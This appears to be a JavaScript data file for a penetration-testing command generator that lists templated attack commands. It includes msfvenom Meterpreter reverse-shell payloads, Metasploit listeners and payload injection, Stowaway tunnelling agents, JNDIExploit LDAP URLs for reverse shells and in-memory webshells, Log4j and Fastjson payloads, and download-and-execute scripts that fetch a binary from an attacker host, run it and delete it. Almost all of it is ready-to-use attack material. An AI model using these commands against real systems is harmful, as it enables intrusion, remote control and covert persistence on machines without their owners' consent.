...
const msfvenomCommands = withCommandType(
    ...
    [
        ...
        {
            "name": "⭐Windows Meterpreter Staged Reverse HTTPS (x64)",
        ...
        {
            "name": "Windows Meterpreter Stageless Reverse HTTPS (x64)",
            "command": "msfvenom -p windows/x64/meterpreter_reverse_https LHOST={ip} LPORT={port} -f exe -o reverse.exe",
            "meta": ["msfvenom", "windows", "stageless", "reverse"]
        },
        // {
        ...
        {
            "name": "Linux Meterpreter Stageless Reverse TCP (x64)",
            "command": "msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
        ...
        // },
        {
            "name": "🌟Linux Meterpreter Stageless Reverse HTTPS (x64)",
            "command": "msfvenom -p linux/x64/meterpreter_reverse_https LHOST={ip} LPORT={port} -f elf -o reverse.elf",
            "meta": ["msfvenom", "linux", "meterpreter", "stageless", "reverse"]
        },
        {
...
const msfconsoleCommands = withCommandType(
    CommandType.MSFConsole,
    [
        {
            "name": "Metasploit Listener",
            "command": "# Open Msf monitoring\n" +
                "# Here it will be switched synchronously with the Payload in msfvenom\n\n" +
                ...
                "exploit -j\n",
            "meta": ["msfconsole", "windows", "staged", "meterpreter", "reverse"]
        },
        {
            "name": "MSF -> CS (HTTPS)",
            "command": "use exploit/windows/local/payload_inject\n" +
        ...
        {
            "name": "Run Proxy",
            "command": "msf6 > route add 192.168.1.0 255.255.255.0 1\n\n" +
                "------ or -----" +
                "\n\n" +
        ...
        // },
        // {
        //     "name": "Windows Stageless TCP (x64)",
        //     "command": "use exploit/multi/handler\n" +
        ...
        //         "set ExitOnSession false\n" +
        //         "exploit -j\n",
        //     "meta": ["msfconsole", "windows", "stageless", "meterpreter", "reverse"]
        // },
        // {
        //     "name": "Windows Stageless HTTPS (x64)",
        //     "command": "use exploit/multi/handler\n" +
        ...
        //         "set ExitOnSession false\n" +
        //         "exploit -j\n",
        //     "meta": ["msfconsole", "linux", "staged", "meterpreter", "reverse"]
        // },
        // {
        //     "name": "Linux Stageless TCP (x64)",
        //     "command": "use exploit/multi/handler\n" +
        //         "set payload linux/x64/meterpreter/reverse_tcp\n" +
        //         "set LPORT {port}\n" +
        //         "set LHOST 0.0.0.0\n" +
        //         "set ExitOnSession false\n" +
        //         "exploit -j\n",
        //     "meta": ["msfconsole", "linux", "stageless", "meterpreter", "reverse"]
        // },
        // {
        //     "name": "Linux Stageless HTTPS (x64)",
        //     "command": "use exploit/multi/handler\n" +
...
const stowawayCommands = withCommandType(
    CommandType.Stowaway,
    [
        {
            "name": "Admin listen",
            "command": "stowaway_admin -l {port} -token {token}",
            "meta": []
        },
        {
            "name": "Admin connect",
            "command": "stowaway_admin -c {targetIP}:{targetPort} -token {token}",
            "meta": []
        },
        {
            "name": "Generate encrypted Param (reverse)",
            "command": "encrypt {hostname} \"{downloadFilename} -c {ip}:{port} -token {token}\"",
            "meta": []
        },
        {
            "name": "Origin param for agent（reverse）",
            "command": "{downloadFilename} -c {ip}:{port} -token {token}",
            "meta": []
        },
        {
            "name": "Generate encrypted Param (listen)",
            "command": "encrypt {hostname} \"{downloadFilename} -l {targetPort} -token {token}\"",
            "meta": []
        },
        {
            "name": "Origin param for agent（listen）",
            "command": "{filename} -l {targetPort} -token {token}",
            "meta": []
        },
        {
...
const jndinjectionCommands = withCommandType(
    CommandType.JNDInjection,
    [
        {
            "name": "JNDIExploit-1.4 start the command",
            "command": "java -jar JNDIExploit-1.4-SNAPSHOT.jar -i {ip} -p {httpPort} -l {ldapPort}",
            "meta": []
        },
        {
            "name": "Java Bytecode Exec By LDAP (jdk8u<191)",
            "command": "ldap://{ip}:{ldapPort}/Basic/Dnslog/{dnslog}\n" +
                "ldap://{ip}:{ldapPort}/Basic/Command/{command}\n" +
                "ldap://{ip}:{ldapPort}/Basic/Command/Base64/{base64_command}\n" +
                "ldap://{ip}:{ldapPort}/Basic/ReverseShell/{ip}/{port}\n" +
                "ldap://{ip}:{ldapPort}/Basic/TomcatEcho\n" +
                "ldap://{ip}:{ldapPort}/Basic/SpringEcho\n" +
                "ldap://{ip}:{ldapPort}/Basic/WeblogicEcho\n" +
                "ldap://{ip}:{ldapPort}/Basic/TomcatMemshell1\n" +
                "ldap://{ip}:{ldapPort}/Basic/TomcatMemshell2\n" +
                "ldap://{ip}:{ldapPort}/Basic/TomcatMemshell3\n" +
                "ldap://{ip}:{ldapPort}/Basic/GodzillaMemshell\n" +
                "ldap://{ip}:{ldapPort}/Basic/JettyMemshell\n" +
                "ldap://{ip}:{ldapPort}/Basic/WeblogicMemshell1\n" +
                "ldap://{ip}:{ldapPort}/Basic/WeblogicMemshell2\n" +
                "ldap://{ip}:{ldapPort}/Basic/JBossMemshell\n" +
                "ldap://{ip}:{ldapPort}/Basic/WebsphereMemshell\n" +
                "ldap://{ip}:{ldapPort}/Basic/SpringMemshell",
            "meta": []
        },

        {
            "name": "Deserialization",
            "command": "ldap://{ip}:{ldapPort}/Deserialization/{GadgetType}/{PayloadType}/{Params}\n" +
                "ldap://{ip}:{ldapPort}/Deserialization/URLDNS/{dnslog}\n" +
                "ldap://{ip}:{ldapPort}/Deserialization/CommonsCollectionsK1/Dnslog/{dnslog}\n" +
                "ldap://{ip}:{ldapPort}/Deserialization/CommonsCollectionsK2/Command/Base64/{base64_command}\n" +
                "ldap://{ip}:{ldapPort}/Deserialization/CommonsBeanutils1/ReverseShell/{ip}/{port}\n" +
                "ldap://{ip}:{ldapPort}/Deserialization/CommonsBeanutils2/TomcatEcho\n" +
                "ldap://{ip}:{ldapPort}/Deserialization/C3P0/SpringEcho\n" +
                "ldap://{ip}:{ldapPort}/Deserialization/Jdk7u21/WeblogicEcho\n" +
                "ldap://{ip}:{ldapPort}/Deserialization/Jre8u20/TomcatMemshell\n" +
                "ldap://{ip}:{ldapPort}/Deserialization/CVE_2020_2555/WeblogicMemshell1\n" +
                "ldap://{ip}:{ldapPort}/Deserialization/CVE_2020_2883/WeblogicMemshell2",
            "meta": []
        },

        {
            "name": "TomcatBypass",
            "command": "ldap://{ip}:{ldapPort}/TomcatBypass/Dnslog/{dnslog}\n" +
                "ldap://{ip}:{ldapPort}/TomcatBypass/Command/{command}\n" +
                "ldap://{ip}:{ldapPort}/TomcatBypass/Command/Base64/{base64_command}\n" +
                "ldap://{ip}:{ldapPort}/TomcatBypass/ReverseShell/{ip}/{port}\n" +
                "ldap://{ip}:{ldapPort}/TomcatBypass/TomcatEcho\n" +
                "ldap://{ip}:{ldapPort}/TomcatBypass/SpringEcho\n" +
                "ldap://{ip}:{ldapPort}/TomcatBypass/TomcatMemshell1\n" +
                "ldap://{ip}:{ldapPort}/TomcatBypass/TomcatMemshell2\n" +
                "ldap://{ip}:{ldapPort}/TomcatBypass/TomcatMemshell3\n" +
                "ldap://{ip}:{ldapPort}/TomcatBypass/GodzillaMemshell\n" +
                "ldap://{ip}:{ldapPort}/TomcatBypass/SpringMemshell\n" +
                "ldap://{ip}:{ldapPort}/TomcatBypass/Meterpreter/{ip}/{port}",
            "meta": []
        },

        {
            "name": "Other Factory Bypass",
            "command": "ldap://{ip}:{ldapPort}/GroovyBypass/Command/{command}\n" +
                "ldap://{ip}:{ldapPort}/GroovyBypass/Command/Base64/{base64_command}\n" +
                "ldap://{ip}:{ldapPort}/WebsphereBypass/List/file={file or directory}\n" +
                "ldap://{ip}:{ldapPort}/WebsphereBypass/Upload/Dnslog/{dnslog}\n" +
                "ldap://{ip}:{ldapPort}/WebsphereBypass/Upload/Command/{command}\n" +
                "ldap://{ip}:{ldapPort}/WebsphereBypass/Upload/Command/Base64/{base64_command}\n" +
                "ldap://{ip}:{ldapPort}/WebsphereBypass/Upload/ReverseShell/{ip}/{port}\n" +
                "ldap://{ip}:{ldapPort}/WebsphereBypass/Upload/WebsphereMemshell\n" +
                "ldap://{ip}:{ldapPort}/WebsphereBypass/RCE/path={uploaded_jar_path}",
            "meta": []
        },
    ]
)

const ysouiCommands = withCommandType(
    CommandType.Ysoui,
    [
        {
...
const MiscCommands = withCommandType(
    CommandType.Misc,
    [
        {
            "name": "VPS URL",
        ...
        },
        {
            ...
            "command": "python3 -m http.server {httpPort}",
            "meta": []
        },
        {
            "name": "Python2 Http Server",
            "command": "python -m SimpleHTTPServer {httpPort}",
            "meta": []
        },
        {
            "name": "Bash -c Base64 Command",
            "command": "bash -c '{echo,{base64_command}}|{base64,-d}|{bash,-i}'",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Linux Download script (curl) 1",
            "command": "# 用于自动下载、运行上线的脚本\n" +
                "# 可以配合 curl {ip}/{filename}.sh|bash 来运行\n" +
                "# H为下载host，F为下载的文件名，T为下载到哪个目录以及指定文件名\n" +
                "\n" +
                "H={ip}:{httpPort}\n" +
                "F={filename}\n" +
                "T={downloadPath}{downloadFilename}\n" +
                "curl $H/$F -o $T\n" +
                "chmod +x $T\n" +
                "$T &\n" +
                "rm $T\n" +
        ...
        {
            "name": "Linux Download script (curl) 2",
            "command": "curl {ip}:{httpPort}/{filename} -o {downloadPath}{downloadFilename}\n" +
                "chmod u+x {downloadPath}{downloadFilename}\n" +
                "{downloadPath}{downloadFilename} &\n\n",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Linux Download script (wget)",
            "command": "wget {ip}:{httpPort}/{filename} -O {downloadPath}{downloadFilename}\n" +
                "chmod u+x {downloadPath}{downloadFilename}\n" +
                "{downloadPath}{downloadFilename} &\n\n",
            "meta": ["linux", "mac"]
        },
        {
            "name": "Windows Download (certutil)",
            "command": "certutil -urlcache -split -f http://{ip}:{httpPort}/{filename} {downloadPath}{downloadFilename}\n" +
                "\n\n" +
                "eg: \n" +
                "certutil & certutil -urlcache -split -f http://http://1.2.3.4:8080/agent.exe C:\\Windows\\Temp\\agent\n",
            "meta": []
        },
        {
            "name": "Windows Download (bitsadmin)",
            "command": "bitsadmin /transfer myDownLoadJob /download /priority normal \"http://{ip}:{httpPort}/{filename}\" \"{downloadPath}{downloadFilename}\"\n" +
                "\n\n" +
                "eg: \n" +
                "bitsadmin /transfer myDownLoadJob /download /priority normal \"http://http://1.2.3.4:8080/agent.exe\" \"C:/Windows/Temp/agent.exe\"\n",
            "meta": []
        },
        {
            "name": "Log4j Basic Payload",
            "command": "${jndi:ldap://{ip}:{ldapPort}/}",
            "meta": ['log4j']
        },
        {
            "name": "Log4j Dnslog Detection",
            "command": "${jndi:ldap://{dnslog}/}",
            "meta": ['log4j']
        },
        {
            "name": "Fastjson Version Detection",
            "command": "{\"@type\":\"java.lang.AutoCloseable\"",
            "meta": ['fastjson']
        },
        {
            "name": "Fastjson Dnslog Detection",
            "command": "{\"@type\":\"java.net.Inet4Address\",\"val\":\"{dnslog}\"}",
            "meta": ['fastjson']
        },
